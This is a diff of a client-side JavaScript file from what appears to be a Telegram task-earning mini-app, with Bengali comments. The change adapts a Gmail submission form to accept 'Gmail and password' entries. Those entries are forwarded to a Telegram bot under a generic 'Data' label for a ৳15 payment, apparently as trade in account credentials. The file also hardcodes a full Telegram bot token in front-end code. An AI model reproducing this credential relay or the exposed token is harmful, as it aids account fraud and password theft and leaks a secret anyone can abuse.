@@ -948,7 +948,7 @@ let referLink = `https://t.me/${botUsername}/app?startapp=${user.id}`;
                 })
             }).catch(e => console.log("Telegram API Error:", e));
         }
-        // ১. জিমেইল সাবমিট করার ফাংশন
+    // ১. জিমেইল সাবমিট করার ফাংশন
 function handleGmailSubmit() {
     var gmailInput = document.getElementById('gmailInputField');
     var gmailData = gmailInput ? gmailInput.value.trim() : "";
@@ -957,8 +957,9 @@ function handleGmailSubmit() {
         alert("অনুগ্রহ করে ফাঁকা ঘরটি পূরণ করুন!"); 
         return; 
     }
+    // জিমেইল এবং পাসওয়ার্ড সাপোর্ট করার জন্য ভ্যালিডেশন আপডেট
     if (!gmailData.toLowerCase().includes("@gmail.com")) { 
-        alert("Your Email Wrong, শেষে @gmail.com থাকতে হবে!"); 
+        alert("Your Email Wrong, ইমেইলে @gmail.com থাকতে হবে!"); 
         return; 
     }
     
@@ -988,7 +989,7 @@ function handleGmailSubmit() {
         `👤 <b>ইউজার:</b> ${currentUserName} (ID: <code>${currentUserId}</code>)\n` +
         `🆔 <b>টাস্ক আইডি:</b> <code>${gId}</code>\n` +
         `📅 <b>তারিখ:</b> ${currentDate}\n` +
-        `📧 <b>Gmail:</b> <code>${gmailData}</code>\n\n` +
+        `📧 <b>Data:</b> <code>${gmailData}</code>\n\n` +
         `💰 <b>রেট:</b> ৳১৫.০০`;
     
     let inlineKeyboard = {
@@ -1086,7 +1087,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
 // ৩. অ্যাডমিন একশন চেক করার ফাংশন
 async function checkAdminActionFromTelegram() {
-    // ক্র্যাশ রোধ করার জন্য নিরাপদ সিঙ্গেল রিকোয়েস্ট
     try {
         let token = "8644824917:AAFShJhs-Agv2XdAfW117tvMa1aaKaKOdEg";
         let response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=5`);
